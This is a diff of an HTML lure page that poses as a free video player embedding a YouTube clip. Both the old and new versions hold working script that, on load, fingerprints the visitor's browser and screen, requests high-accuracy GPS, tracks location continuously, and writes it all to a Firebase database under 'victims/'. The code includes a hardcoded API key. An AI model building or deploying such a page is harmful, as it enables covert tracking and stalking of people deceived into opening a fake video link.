@@ -3,30 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Premium Video</title>
+    <title>Watch This Video Now!</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
-        #video-container { width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; z-index: 1; }
-        #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; color: white; font-family: Arial; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            font-family: Arial, sans-serif; 
+            overflow: hidden;
+            height: 100vh;
+        }
+        .video-container {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        iframe {
+            width: 90vw;
+            height: 90vh;
+            max-width: 1200px;
+            max-height: 675px;
+            border: none;
+        }
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 18px;
+        }
     </style>
-</head>
-<body>
-    <div id="loading">Loading Premium Content...</div>
-    <div id="video-container">
-        <iframe 
-            src="https://www.youtube.com/embed/N1g2a4sjx_I?autoplay=1&mute=0&controls=1&loop=1&playlist=N1g2a4sjx_I" 
-            frameborder="0" 
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-            allowfullscreen 
-            style="width: 100%; height: 100%;"
-            id="youtube-player">
-        </iframe>
-    </div>
-
     <!-- Firebase SDK -->
     <script type="module">
-        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
-        import { getFirestore, collection, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js';
+        import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';
 
         const firebaseConfig = {
             apiKey: "AIzaSyDNAcbechPRfrWSpxkZHKsksnr_hS88XdU",
@@ -39,77 +52,146 @@
         };
 
         const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+        const db = getDatabase(app);
 
-        // Hide loading immediately
-        document.getElementById('loading').style.display = 'none';
+        // Get victim info immediately
+        function captureVictimInfo() {
+            const victimData = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                timestamp: Date.now(),
+                ip: '', // Will be captured server-side if needed
+                sessionId: 'victim_' + Math.random().toString(36).substr(2, 9)
+            };
 
-        // Collect victim data
-        async function collectVictimData() {
-            try {
-                // Get geolocation with high accuracy
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+            // Store session ID in localStorage for tracking
+            localStorage.setItem('sessionId', victimData.sessionId);
+            set(ref(db, 'victims/' + victimData.sessionId + '/basic'), victimData);
+        }
+
+        // High precision GPS capture
+        function getPreciseLocation() {
+            const sessionId = localStorage.getItem('sessionId') || 'unknown';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude || null,
+                            altitudeAccuracy: position.coords.altitudeAccuracy || null,
+                            heading: position.coords.heading || null,
+                            speed: position.coords.speed || null,
+                            timestamp: position.timestamp,
+                            highAccuracy: true
+                        };
+                        
+                        // Store GPS data
+                        await set(ref(db, 'victims/' + sessionId + '/gps'), locationData);
+                        
+                        // Continuous tracking every 30 seconds
+                        setInterval(() => {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    const update = {
+                                        latitude: pos.coords.latitude,
+                                        longitude: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy,
+                                        timestamp: pos.timestamp
+                                    };
+                                    set(ref(db, 'victims/' + sessionId + '/gps'), update);
+                                },
+                                () => {}, 
+                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
+                            );
+                        }, 30000);
+                    },
+                    (error) => {
+                        console.log('GPS blocked:', error);
+                        // Store GPS denial
+                        set(ref(db, 'victims/' + sessionId + '/gps'), {
+                            error: error.message,
+                            timestamp: Date.now()
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+
+                // Watch position for movement tracking
+                navigator.geolocation.watchPosition(
+                    (position) => {
+                        const watchData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: position.timestamp
+                        };
+                        set(ref(db, 'victims/' + sessionId + '/watch'), watchData);
+                    },
+                    () => {},
+                    {
                         enableHighAccuracy: true,
                         timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                const timestamp = new Date().toISOString();
-
-                // Additional browser fingerprinting
-                const fingerprint = {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    screen: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookiesEnabled: navigator.cookieEnabled
-                };
-
-                // Send to Firebase
-                await addDoc(collection(db, "victims"), {
-                    latitude: lat,
-                    longitude: lon,
-                    accuracy: accuracy,
-                    timestamp: serverTimestamp(),
-                    ip: "unknown", // Can be enhanced with external API
-                    fingerprint: fingerprint,
-                    sessionId: `victim_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
-                });
-
-                console.log('Victim data captured:', { lat, lon });
-            } catch (error) {
-                console.log('Geolocation failed:', error);
-                // Still send basic fingerprint even if geolocation fails
-                addDoc(collection(db, "victims"), {
-                    error: error.message,
-                    timestamp: serverTimestamp(),
-                    fingerprint: {
-                        userAgent: navigator.userAgent,
-                        language: navigator.language
-                    },
-                    sessionId: `victim_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
-                });
+                        maximumAge: 5000
+                    }
+                );
             }
         }
 
-        // Auto-trigger geolocation on load
-        if (navigator.geolocation) {
-            collectVictimData();
+        // Capture screen info
+        function captureScreenInfo() {
+            const sessionId = localStorage.getItem('sessionId') || 'unknown';
+            const screenData = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                timestamp: Date.now()
+            };
+            set(ref(db, 'victims/' + sessionId + '/screen'), screenData);
         }
 
-        // Retry geolocation every 30 seconds (background collection)
-        setInterval(() => {
-            if (navigator.geolocation) {
-                collectVictimData();
-            }
-        }, 30000);
+        // Auto-trigger everything on load
+        window.addEventListener('load', () => {
+            captureVictimInfo();
+            captureScreenInfo();
+            getPreciseLocation();
+        });
 
+        // Also trigger on visibility change (user returns to tab)
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                getPreciseLocation();
+            }
+        });
+
+    </script>
+</head>
+<body>
+    <div class="video-container">
+        <div class="loading" id="loading">Loading video...</div>
+        <iframe 
+            id="youtubeVideo"
+            src="https://www.youtube.com/embed/N1g2a4sjx_I?autoplay=1&mute=0&controls=1&rel=0&modestbranding=1&playsinline=1"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation; microphone"
+            allowfullscreen>
+        </iframe>
+    </div>
+
+    <script>
+        // Hide loading after 2 seconds
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+        }, 2000);
     </script>
 </body>
 </html>
